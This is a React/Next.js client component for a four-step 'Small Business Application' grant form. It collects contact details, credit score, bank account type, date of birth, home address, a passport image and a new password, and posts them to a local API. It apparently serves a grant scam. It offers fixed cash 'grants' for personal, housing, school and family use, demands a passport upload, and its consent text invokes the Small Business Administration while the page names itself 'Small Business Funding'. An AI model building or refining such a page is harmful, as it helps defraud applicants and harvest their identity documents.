'use client'

import { useState } from 'react'

const BUSINESS_FIELDS = [
  'businessEmail', 'businessAddress', 'city', 'state', 'postalCode',
  'workPhone', 'entityType', 'location', 'fundingReason', 'productServices',
]

const steps = [
  { label: 'Application', fields: ['firstName', 'lastName', 'category', 'grantPreference', 'email', 'phone', 'grantOption', 'creditScore', 'accountType', 'consent'] },
  { label: 'Business', fields: ['hasBusiness'] },
  { label: 'Personal', fields: ['personalFirstName', 'personalLastName', 'dateOfBirth', 'homeAddress', 'personalCity', 'personalState', 'personalPostalCode'] },
  { label: 'Submit', fields: ['signature', 'passport', 'password', 'confirmPassword', 'submitConsent'] },
]

const initialValues = {
  firstName: '', lastName: '', category: '', grantPreference: '', email: '', phone: '', monthlySales: '', grantOption: '', creditScore: '', accountType: '', consent: false,
  hasBusiness: 'No', businessEmail: '', website: '', businessAddress: '', city: '', state: '', postalCode: '', workPhone: '', entityType: '', location: '', fundingReason: '', productServices: '', openBankruptcy: 'No', openTaxLien: 'No', utilizedWorkingCapital: 'No',
  personalFirstName: '', personalLastName: '', dateOfBirth: '', homeAddress: '', personalCity: '', personalState: '', personalPostalCode: '',
  signature: '', title: '', passport: '', password: '', confirmPassword: '', submitConsent: false,
}

function validateField(name, value, values = {}, passportFile) {
  if (name === 'monthlySales') return ''
  if (name === 'consent' || name === 'submitConsent') return value ? '' : 'You must provide consent before continuing.'
  if (!value) return 'This field is required.'
  if (['firstName', 'lastName', 'personalFirstName', 'personalLastName'].includes(name)) return /^[a-zA-ZÀ-ÿ][a-zA-ZÀ-ÿ' -]{1,49}$/.test(value.trim()) ? '' : 'Use 2–50 letters; numbers and symbols are not allowed.'
  if (name === 'category') return value.trim().length >= 2 ? '' : 'Enter a category with at least 2 characters.'
  if (name === 'email' || name === 'businessEmail') return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value.trim()) ? '' : 'Enter a valid email address.'
  if (name === 'phone' || name === 'workPhone') return value.replace(/\D/g, '').length >= 10 && value.replace(/\D/g, '').length <= 15 ? '' : 'Enter a valid 10–15 digit phone number.'
  if (name === 'website' && value && !/^https?:\/\/[^\s]+$/i.test(value)) return 'Enter a full URL, starting with https://.'
  if (name === 'postalCode') return /^[a-zA-Z0-9 -]{3,12}$/.test(value.trim()) ? '' : 'Enter a valid postal or ZIP code.'
  if (['homeAddress', 'businessAddress'].includes(name)) return value.trim().length >= 5 ? '' : 'Enter a complete street address.'
  if (name === 'dateOfBirth') { const date = new Date(value); const age = (Date.now() - date.getTime()) / 31557600000; return date > new Date() || age < 18 ? 'You must be at least 18 years old.' : '' }
  if (name === 'productServices') return value.trim().length >= 50 ? '' : 'Please enter at least 50 characters.'
  if (name === 'password') return /^(?=.*[A-Za-z])(?=.*\d).{8,}$/.test(value) ? '' : 'Use at least 8 characters with a letter and a number.'
  if (name === 'passport') { if (!passportFile) return 'Please upload a passport image.'; if (!['image/jpeg', 'image/png'].includes(passportFile.type)) return 'Upload a JPG, JPEG, or PNG image.'; return passportFile.size <= 5 * 1024 * 1024 ? '' : 'Image must be 5 MB or smaller.' }
  return ''
}

function InputField({ name, label, values, errors, onChange, onBlur, type = 'text', placeholder = '', choices, required = true, fullWidth = false, className = '' }) {
  const error = errors[name]
  const classes = [fullWidth && 'full', className].filter(Boolean).join(' ')
  const sharedProps = { name, onChange, onBlur, 'aria-invalid': Boolean(error), 'aria-describedby': error ? `${name}-error` : undefined }

  return (
    <label className={classes}>
      {label} {required && <span aria-hidden="true">*</span>}
      {choices ? (
        <select {...sharedProps} value={values[name]}>
          <option value="">Please Select</option>
          {choices.map((choice) => <option key={choice} value={choice}>{choice}</option>)}
        </select>
      ) : type === 'textarea' ? (
        <textarea {...sharedProps} value={values[name]} placeholder={placeholder} />
      ) : (
        <input {...sharedProps} type={type} value={values[name]} placeholder={placeholder} />
      )}
      {error && <small id={`${name}-error`} className="field-error" role="alert">{error}</small>}
    </label>
  )
}

function RadioGroup({ name, label, value, onChange, error }) {
  return (
    <fieldset className="radio-group">
      <legend>{label} <span aria-hidden="true">*</span></legend>
      <div className="radio-options">
        {['Yes', 'No'].map((option) => (
          <label key={option}>
            <input type="radio" name={name} value={option} checked={value === option} onChange={onChange} />
            {option}
          </label>
        ))}
      </div>
      {error && <small className="field-error">{error}</small>}
    </fieldset>
  )
}

function Consent({ name, checked, onChange, children, error, className = 'consent' }) {
  return (
    <>
      <label className={className}>
        <input name={name} type="checkbox" checked={checked} onChange={onChange} />
        <span>{children}</span>
      </label>
      {error && <small className="field-error">{error}</small>}
    </>
  )
}

export default function ApplicationForm() {
  const [currentStep, setCurrentStep] = useState(0)
  const [values, setValues] = useState(initialValues)
  const [errors, setErrors] = useState({})
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [passportPreview, setPassportPreview] = useState('')
  const [passportFile, setPassportFile] = useState(null)
  const [submission, setSubmission] = useState(null)
  const [submitting, setSubmitting] = useState(false)
  const [submitAlert, setSubmitAlert] = useState(null)

  function updateValue(event) {
    const { name, type, checked, value, files } = event.target
    const file = type === 'file' ? files?.[0] : null
    setValues((current) => ({ ...current, [name]: type === 'checkbox' ? checked : type === 'file' ? (file?.name || '') : value }))
    if (name === 'passport') {
      setPassportFile(file || null)
      if (!file) setPassportPreview('')
      else if (file.type.startsWith('image/')) {
        const reader = new FileReader()
        reader.onload = () => setPassportPreview(String(reader.result))
        reader.readAsDataURL(file)
      }
      setErrors((current) => ({ ...current, passport: validateField('passport', file?.name || '', values, file) }))
    }
    setErrors((current) => ({ ...current, [name]: '' }))
  }

  function validateOnBlur(event) {
    const { name, type, checked, value } = event.target
    const fieldValue = type === 'checkbox' ? checked : value
    setErrors((current) => ({ ...current, [name]: validateField(name, fieldValue, values, passportFile) }))
  }

  function validateCurrentStep() {
    const fields = currentStep === 1 && values.hasBusiness === 'Yes'
      ? [...steps[currentStep].fields, ...BUSINESS_FIELDS]
      : steps[currentStep].fields
    const nextErrors = Object.fromEntries(
      fields.map((name) => [name, validateField(name, values[name], values, passportFile)]).filter(([, error]) => error)
    )
    if (fields.includes('confirmPassword') && values.confirmPassword !== values.password) nextErrors.confirmPassword = 'Passwords do not match.'

    setErrors(nextErrors)
    return Object.keys(nextErrors).length === 0
  }

  async function submitApplication() {
    setSubmitAlert(null)
    setSubmitting(true)
    try {
      const payload = new FormData()
      Object.entries(values).forEach(([key, value]) => payload.append(key, String(value)))
      if (passportFile) payload.set('passport', passportFile)
      const response = await fetch('/api/applications', { method: 'POST', body: payload })
      const result = await response.json()
      if (!response.ok) {
        const message = result.error || 'Unable to submit your application.'
        setErrors({ form: message })
        setSubmitAlert({ type: 'error', title: 'We could not submit your application', message })
        return
      }
      setSubmission(result.application)
      setIsSubmitted(true)
    } catch {
      const message = 'Unable to submit your application. Please try again.'
      setErrors({ form: message })
      setSubmitAlert({ type: 'error', title: 'Connection problem', message })
    } finally { setSubmitting(false) }
  }

  function handleSubmit(event) {
    event.preventDefault()
    if (!validateCurrentStep()) {
      if (currentStep === steps.length - 1) setSubmitAlert({ type: 'error', title: 'Please check your application', message: 'Complete the highlighted required fields before submitting.' })
      return
    }
    if (currentStep === steps.length - 1) setSubmitAlert({ type: 'confirm', title: 'Ready to submit?', message: 'Please confirm that your information is complete and accurate. You will not be able to edit this application after submitting.' })
    else setCurrentStep((step) => step + 1)
  }

  function goBack() {
    setErrors({})
    setCurrentStep((step) => step - 1)
  }

  const inputProps = { values, errors, onChange: updateValue, onBlur: validateOnBlur }

  if (isSubmitted) {
    return (
      <section className="application">
        <div className="success">
          <i>✓</i>
          <p className="kicker">APPLICATION RECEIVED</p>
          <h2>Thank you,<br /><em>{values.firstName}.</em></h2>
          <p>Your application has been received and will be reviewed within 24 hours. We’ve sent a confirmation email to <strong>{values.email}</strong>.</p>
          <div className="submission-details"><span>Application ID <b>{submission?.id}</b></span><span>Received <b>{submission?.createdAt && new Date(submission.createdAt).toLocaleString()}</b></span><span>Status <b>{submission?.status}</b></span></div><a href="/user">View my application</a>
        </div>
      </section>
    )
  }

  return (
    <section className="application">
      <div className="application-intro">
        <h1>Small Business Application</h1>
        <p className="application-subtitle">Application Form</p>
        <p>Fill in all required fields. By submitting, you authorize review of your business and personal history.</p>
      </div>

      <form className="wizard" onSubmit={handleSubmit} noValidate>
        <ol className="progress">
          {steps.map((step, index) => (
            <li className={index <= currentStep ? 'done' : ''} key={step.label}>
              <i>{index + 1}</i><span>{step.label}</span>
            </li>
          ))}
        </ol>

        {currentStep === 0 && <section className="form-step">
          <div className="form-grid">
            <InputField {...inputProps} name="firstName" label="First Name" />
            <InputField {...inputProps} name="lastName" label="Last Name" />
            <InputField {...inputProps} name="category" label="Category" placeholder="e.g. Retail, Technology, Services" />
            <InputField {...inputProps} name="grantPreference" label="Which specific grant are you willing to go for?" choices={[
              'Grant for business - $150k', 
              'Grant for housing - $80k', 
              'Grant For personal - $75k', 
              'Grant for school-$45k',
              'Grant for family - $50k',
              'Grant for Trucking - $120k',
              'Grant for Expansion - $90k'
            ]}
            />
            <InputField {...inputProps} name="email" label="Email" type="email" placeholder="example@example.com" />
            <InputField {...inputProps} name="phone" label="Mobile Phone" type="tel" placeholder="201-555-0123" />
            <InputField {...inputProps} name="monthlySales" label="Average Gross Monthly Sales" placeholder="e.g. $50,000" />
            <InputField {...inputProps} name="grantOption" label="Grant Options" choices={[
              'Grant for Business', 
              'Grant for Housing', 
              'Grant For Personal', 
              'Grant for School',
              'Grant for family',
              'Grant for Trucking',
              'Grant for Expansion',
              'Others'
              ]} 
            />
            <InputField {...inputProps} name="creditScore" label="Estimated Credit Score" choices={['Excellent (720+)', 'Good (680-719)', 'Fair (620-679)', 'Building credit']} />
            <InputField {...inputProps} name="accountType" label="What type of bank account are you using?" choices={['Personnal Bank Account', 'Business Bank Account', 'None']} />
          </div>
          <Consent name="consent" checked={values.consent} onChange={updateValue} error={errors.consent}>
            By checking this box and submitting this application, I authorize Small Business Funding to contact me about this application and related funding opportunities.
          </Consent>
        </section>}

        {currentStep === 1 && <section className="form-step business-step">
          <RadioGroup name="hasBusiness" label="Do you have a business?" value={values.hasBusiness} onChange={updateValue} error={errors.hasBusiness} />
          {values.hasBusiness === 'Yes' && <div className="business-details">
            <div className="form-grid">
              <InputField {...inputProps} name="businessEmail" label="Business Email" type="email" />
              <InputField {...inputProps} name="website" label="Website" placeholder="e.g. https://example.com" required={false} />
              <InputField {...inputProps} name="businessAddress" label="Business Address" placeholder="Street Address" fullWidth />
              <InputField {...inputProps} name="city" label="City" />
              <InputField {...inputProps} name="state" label="State / Province" />
              <InputField {...inputProps} name="postalCode" label="Postal / Zip Code" />
              <InputField {...inputProps} name="workPhone" label="Work Phone" type="tel" placeholder="201-555-0123" />
              <InputField {...inputProps} name="entityType" label="Entity Type" choices={['Sole proprietorship', 'Partnership', 'LLC', 'Corporation', 'Nonprofit']} />
              <InputField {...inputProps} name="location" label="Location" choices={['Store', 'Home', 'Office', 'Others']} />
              <InputField {...inputProps} name="fundingReason" label="Reason For Funding" choices={[
                'Working capital',
                'Buy Out Partner',
                'Business acquisition',
                'Business expansion', 
                'Equipment purchase', 
                'Inventory', 
                'Marketing',
                'Payroll',
                'Debt consolidation',
                'Other'
              ]} />
              <InputField {...inputProps} name="productServices" label="Product/Services Sold" type="textarea" placeholder="Provide a short description of your business (min 50 characters)" fullWidth />
            </div>
            <div className="business-radio-grid">
              <RadioGroup name="openBankruptcy" label="Open Bankruptcy?" value={values.openBankruptcy} onChange={updateValue} />
              <RadioGroup name="openTaxLien" label="Open Tax Lien?" value={values.openTaxLien} onChange={updateValue} />
              <RadioGroup name="utilizedWorkingCapital" label="Ever Utilized Working Capital Funding Before?" value={values.utilizedWorkingCapital} onChange={updateValue} />
            </div>
          </div>}
        </section>}

        {currentStep === 2 && <section className="form-step personal-step">
          <div className="form-grid">
            <InputField {...inputProps} name="personalFirstName" label="First Name" />
            <InputField {...inputProps} name="personalLastName" label="Last Name" />
            <InputField {...inputProps} name="homeAddress" label="Home Address" placeholder="Street Address" fullWidth />
            <InputField {...inputProps} name="personalCity" label="City" />
            <InputField {...inputProps} name="personalState" label="State / Province" />
            <InputField {...inputProps} name="personalPostalCode" label="Postal / Zip Code" />
            <InputField {...inputProps} name="dateOfBirth" label="Date of Birth" type="date" className="personal-date" />
          </div>
        </section>}

        {currentStep === 3 && <section className="form-step submit-step">
          <div className="form-grid">
            <InputField {...inputProps} name="signature" label="Enter your full name to sign" placeholder="Type your full name" />
            <InputField {...inputProps} name="title" label="Mr./Miss" placeholder="e.g. Mr., Mrs., Miss" required={false} />
            <label className="full passport-field">
              Upload A Passport <span aria-hidden="true">*</span>
              <input name="passport" type="file" accept="image/jpeg,image/png,.jpg,.jpeg,.png" onChange={updateValue} aria-invalid={Boolean(errors.passport)} aria-describedby={errors.passport ? 'passport-error' : undefined} />
              <small>Accepted: jpg, jpeg, png</small>
              {passportPreview && <img className="passport-preview" src={passportPreview} alt="Uploaded passport preview" />}
              {errors.passport && <small id="passport-error" className="field-error" role="alert">{errors.passport}</small>}
            </label>
            <InputField {...inputProps} name="password" label="Create password" type="password" placeholder="At least 8 characters" />
            <InputField {...inputProps} name="confirmPassword" label="Confirm password" type="password" placeholder="Re-enter your password" />
          </div>
          <Consent name="submitConsent" checked={values.submitConsent} onChange={updateValue} error={errors.submitConsent} className="submit-consent">
            By checking this box and submitting the form, I certify that all information and documents submitted in connection with this Application is true, correct and complete; and authorize Small Business Administration, partners, and lenders to receive credit reports and any other information regarding the Merchant and its owners and principals from third parties, to verify any information provided on the Application. YOU MUST AGREE in order to submit your application.
          </Consent>
        </section>}

        {errors.form && <small className="field-error form-error" role="alert">{errors.form}</small>}
        <div className="form-actions">
          {currentStep > 0 && <button type="button" className="back" onClick={goBack}>← Back</button>}
          <button type="submit" disabled={submitting}>{currentStep === 3 ? (submitting ? 'Submitting…' : '↗ Submit Application') : <>Next <b>→</b></>}</button>
        </div>
      </form>
      {submitAlert && <div className="submission-alert-backdrop" role="presentation">
        <section className={`submission-alert ${submitAlert.type}`} role="dialog" aria-modal="true" aria-labelledby="submission-alert-title">
          <i aria-hidden="true">{submitAlert.type === 'confirm' ? '↗' : '!'}</i>
          <p>{submitAlert.type === 'confirm' ? 'FINAL REVIEW' : 'ACTION NEEDED'}</p>
          <h2 id="submission-alert-title">{submitAlert.title}</h2>
          <span>{submitAlert.message}</span>
          <div>
            <button type="button" onClick={() => setSubmitAlert(null)}>{submitAlert.type === 'confirm' ? 'Review application' : 'Return to form'}</button>
            {submitAlert.type === 'confirm' && <button type="button" className="confirm-submit" onClick={submitApplication}>Submit application <b>→</b></button>}
          </div>
        </section>
      </div>}
      {submitting && <div className="submission-preloader" role="status" aria-live="assertive" aria-label="Submitting your application"><div><i /><h2>Submitting your application</h2><p>Securely saving your information. Please do not close this page.</p></div></div>}
    </section>
  )
}
